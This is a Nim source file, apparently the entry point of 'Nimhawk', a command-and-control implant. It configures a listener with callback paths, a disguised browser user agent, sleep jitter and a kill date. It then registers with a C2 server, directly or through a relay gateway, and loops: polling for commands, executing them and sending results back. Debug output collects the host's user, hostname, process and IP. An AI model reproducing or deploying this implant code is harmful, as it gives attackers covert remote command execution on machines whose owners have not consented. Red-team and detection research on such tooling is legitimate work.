#[
    Nimhawk Multi-Platform Implant - Hexagonal Architecture
    Minimal entry point - all logic moved to application layer
    by Alejandro Parodi (@hdbreaker_)
]#

import random, strutils, asyncdispatch
import tables
from infrastructure/config/config_loader import parseConfig
import domain/models/implant
import applications/services/implant_orchestrator_service
import applications/services/command_service
import infrastructure/adapters/relay_client_adapter
import infrastructure/repositories/system_info_repository

# Function to determine relay role based on compilation parameters
proc determineRelayRole(): ImplantRole =
    const RELAY_ADDR {.strdefine.}: string = ""
    
    if RELAY_ADDR != "" and RELAY_ADDR.startsWith("relay://"):
        when defined debug:
            echo "[DEBUG] 🔍 Relay role determination: RELAY_CLIENT"
        return RELAY_CLIENT
    else:
        when defined debug:
            echo "[DEBUG] 🔍 Relay role determination: STANDARD"
        return STANDARD

# Main execution function - Minimal entry point
proc runMultiImplant*() {.async.} =
    echo "=== Nimhawk Multi-Platform v1.5.0 - Hexagonal Architecture ==="
    
    # Parse configuration
    let CONFIG = parseConfig()
    
    # Create system info repository for accessing system information
    let system_info_repo = newSystemInfoRepository()
    
    # Create Implant domain model from configuration
    var implant = newImplant()
    implant.role = determineRelayRole()
    implant.listenerType = CONFIG.getOrDefault("listenerType", "HTTP")
    implant.listenerHost = CONFIG.getOrDefault("hostname", "")
    implant.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
    implant.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
    implant.registerPath = CONFIG.getOrDefault("listenerRegPath", "/register")
    implant.taskPath = CONFIG.getOrDefault("listenerTaskPath", "/task")
    implant.resultPath = CONFIG.getOrDefault("listenerResPath", "/result")
    implant.reconnectPath = CONFIG.getOrDefault("reconnectPath", "/reconnect")
    implant.userAgent = CONFIG.getOrDefault("userAgent", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko")
    implant.httpAllowCommunicationKey = CONFIG.getOrDefault("httpAllowCommunicationKey", "DefaultKey123")
    implant.sleepTime = parseInt(CONFIG.getOrDefault("sleepTime", "10"))
    implant.sleepJitter = parseFloat(CONFIG.getOrDefault("sleepJitter", "0"))
    implant.killDate = CONFIG.getOrDefault("killDate", "")
    
    when defined debug:
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $system_info_repo.getCurrentPID()
        echo "[DEBUG] Process: " & system_info_repo.getCurrentProcessName()
        echo "[DEBUG] OS: " & system_info_repo.getOSInfo()
        echo "[DEBUG] User: " & system_info_repo.getUsername()
        echo "[DEBUG] Hostname: " & system_info_repo.getHostname()
        echo "[DEBUG] Local IP: " & system_info_repo.getLocalIP()
        echo "[DEBUG] Implant role: " & (case implant.role:
            of STANDARD: "STANDARD"
            of RELAY_CLIENT: "RELAY_CLIENT"
            of RELAY_SERVER: "RELAY_SERVER")
    
    # Check if compiled as relay client
    const RELAY_ADDR {.strdefine.}: string = ""
    
    if RELAY_ADDR != "" and implant.role == RELAY_CLIENT:
        # RELAY CLIENT MODE - Use relay client adapter
        when defined debug:
            echo "[MAIN] 🔗 Starting RELAY CLIENT mode"
        
        let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
        if cleanRelayAddr.startsWith("relay://"):
            let urlParts = cleanRelayAddr[8..^1].split(":")
            if urlParts.len == 2:
                try:
                    let host = urlParts[0]
                    let port = parseInt(urlParts[1])
                    let agentId = "HTTP-RELAY-CLIENT-" & host & "-" & $port & "-" & $(rand(9999))
                    
                    # Create relay client adapter
                    var relayAdapter = newRelayClientAdapter()
                    
                    # Initialize relay client
                    if not relayAdapter.initRelayClient(host, port, agentId):
                        when defined debug:
                            echo "[MAIN] ❌ Failed to initialize relay client"
                        return
                    
                    # Test connection
                    if not relayAdapter.testGatewayConnection():
                        when defined debug:
                            echo "[MAIN] ❌ Failed to connect to gateway"
                        return
                    
                    # Register with C2 via Gateway
                    if not relayAdapter.registerCumulusAgentViaGateway():
                        when defined debug:
                            echo "[MAIN] ❌ Failed to register with C2"
                        return
                    
                    # Update implant with relay client ID
                    implant.id = relayAdapter.getConfig().cumulusAgentId
                    implant.registered = true
                    
                    when defined debug:
                        echo "[MAIN] ✅ Successfully registered with C2 via Gateway"
                        echo "[MAIN] ✅ Agent ID: " & implant.id
                    
                    # Create command service for command execution
                    let commandService = newCommandService()
                    
                    # Relay client polling loop
                    var relayLoopCount = 0
                    while true:
                        try:
                            relayLoopCount += 1
                            
                            when defined debug:
                                echo ""
                                echo "┌─ 🔗 HTTP RELAY CLIENT CYCLE #" & $relayLoopCount
                                echo "├─ Gateway: " & host & ":" & $port & " │ Agent ID: " & implant.id
                                echo "└─────────────────────────────────────────────────────────"
                            
                            # Poll Gateway for commands
                            let (cmdGuid, cmd, args) = relayAdapter.pollGatewayForCommands()
                            
                            if cmd != "":
                                when defined debug:
                                    echo "[HTTP_RELAY] 📨 Received command: " & cmd
                                
                                # Process command using CommandService
                                let cmdResult = commandService.executeCommand(implant, cmd, cmdGuid, args)
                                
                                when defined debug:
                                    echo "[HTTP_RELAY] 📤 Command result: " & cmdResult
                                
                                # Send result back to Gateway
                                let sent_success = relayAdapter.sendResultToGateway(cmdGuid, cmdResult)
                                
                                when defined debug:
                                    if sent_success:
                                        echo "[HTTP_RELAY] ✅ Result sent to Gateway"
                                    else:
                                        echo "[HTTP_RELAY] ❌ Failed to send result"
                            else:
                                when defined debug:
                                    echo "[HTTP_RELAY] 💤 No commands available"
                            
                            # Sleep before next polling cycle
                            await sleepAsync(2000)
                            
                        except Exception:
                            when defined debug:
                                let error_msg = getCurrentExceptionMsg()
                                echo "[HTTP_RELAY] ❌ Error in relay loop: " & error_msg
                            await sleepAsync(5000)
                except:
                    when defined debug:
                        echo "[DEBUG] Invalid relay address format"
                    return
            else:
                when defined debug:
                    echo "[DEBUG] Invalid port format in relay URL"
                return
        else:
            when defined debug:
                echo "[DEBUG] Invalid relay URL format"
            return
    else:
        # STANDARD MODE - Use orchestrator
        when defined debug:
            echo "[MAIN] 🚀 Starting STANDARD HTTP mode"
        
        # Create orchestrator
        let orchestrator = newImplantOrchestratorService(implant)
        
        # Initialize orchestrator
        await orchestrator.initialize()
        
        # Run polling loop
        await orchestrator.runPollingLoop()

# Entry point
when isMainModule:
    when defined debug:
        let system_info_repo = newSystemInfoRepository()
        echo "=== Nimhawk Multi-Platform v1.5.0 - Hexagonal Architecture ==="
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $system_info_repo.getCurrentPID()
        echo "[DEBUG] Process: " & system_info_repo.getCurrentProcessName()
        echo "[DEBUG] OS: " & system_info_repo.getOSInfo()
        echo "[DEBUG] User: " & system_info_repo.getUsername()
        echo "[DEBUG] Hostname: " & system_info_repo.getHostname()
        echo "[DEBUG] Local IP: " & system_info_repo.getLocalIP()
        echo "[DEBUG] Architecture: Hexagonal (Ports & Adapters)"
        echo "[DEBUG] "
        echo "[DEBUG] Available relay commands:"
        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
        echo "[DEBUG]   relay status             - Show relay status"
        echo "[DEBUG]   relay stop               - Stop relay server"
        echo "[DEBUG] "
        echo "[DEBUG] Relay client build with FAST_MODE:"
        echo "[DEBUG]   make darwin_arm64 RELAY_ADDRESS=relay://ip:port FAST_MODE=1 DEBUG=1"
    
    randomize()
    waitFor runMultiImplant()
